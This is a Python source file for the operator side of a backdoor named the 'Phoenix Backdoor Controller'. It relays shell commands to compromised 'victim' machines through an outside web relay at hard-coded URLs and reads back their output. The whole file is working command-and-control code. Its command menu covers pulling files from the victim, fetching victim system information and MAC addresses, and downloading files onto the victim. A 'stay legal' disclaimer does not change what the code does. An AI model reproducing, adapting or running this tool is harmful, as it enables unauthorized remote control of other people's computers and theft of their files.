'''

- Backdoor Controller coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!

'''

import requests, socket, sys, os, time

# color formatting
HEADER = '\033[95m'
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RED = '\033[91m'
ENDC = '\033[0m'
BRIGHT = '\033[1m'
EBRIGHT = '\033[0m'

# help 
cHelp = WHITE+'''
Backdoor Extra Commands:

:exit                       Close connection to the backdoor.
:delete                     Definetly delete the backdoor from victim.
:download <url> <filename>  Download a file from a given url.
:get <filename>             Get a file from victim.
:help                       Show commands list.
:info                       Get basics victim's informations.
:mac                        Get victim's mac address.

'''

banner = WHITE + '''
 __________ 
< Backdoor >
 ---------- 
     \\
      \\ ''' + RED + ''' (__) ''' + WHITE + '''  Phoenix Backdoor Controller ''' + RED + ''' 
         (\\/)  
  /-------\\/ ''' + WHITE + '''   ]> Coded by'''+BLUE+''' Subn3t ''' + RED + ''' 
 / | 666 ||  ''' + WHITE + '''   ]> Version: ''' + RED + '''1.0.1 
*  ||----||  ''' + WHITE + '''   ]> Have fun and stay'''+YELLOW+''' Legal''' + RED + ''' 
   ~~    ~~         
                    
'''

# shell function
def shell(server, xserver):
    # get welcome
    
    try:
        key, victimIp, victimName, victimDirectory = (requests.get(xserver).text).split('|#|')
    except ValueError:
        shell(server, xserver)

    while True:
        print(WHITE+'['+RED+BRIGHT+victimIp[1:]+WHITE+EBRIGHT+':'+RED+BRIGHT+victimName+WHITE+EBRIGHT+'] '+BRIGHT+BLUE+victimDirectory+EBRIGHT, end='\033[97m> ')
        command = input()
        
        if command == ':exit':
            requests.post(server, data={'key':'hacker','text':command})
            sys.exit()
        elif command == ':help':
            print(cHelp)
        elif command[:2] == 'cd':
            requests.post(server, data={'key':'hacker','text':command})
            output = requests.get(xserver, timeout=1).text
            while output[:3] == '$%&':
                output = requests.get(xserver, timeout=1).text
            victimDirectory = output 
        else:
            requests.post(server, data={'key':'hacker','text':command})
            output = requests.get(xserver, timeout=1).text
            while output[:3] == '$%&':
                output = requests.get(xserver, timeout=1).text
            print('\n'+WHITE+output)



if __name__ in "__main__":
    print(banner)
    xserver = 'http://dxxpnxt.altervista.org/bxckdxxr/file'
    server = 'http://dxxpnxt.altervista.org/bxckdxxr/uni.php'
    #server = 'http://www.pukenga.com/phoenix/uni.php'
    #xserver = 'http://www.pukenga.com/phoenix/file'
    shell(server, xserver)
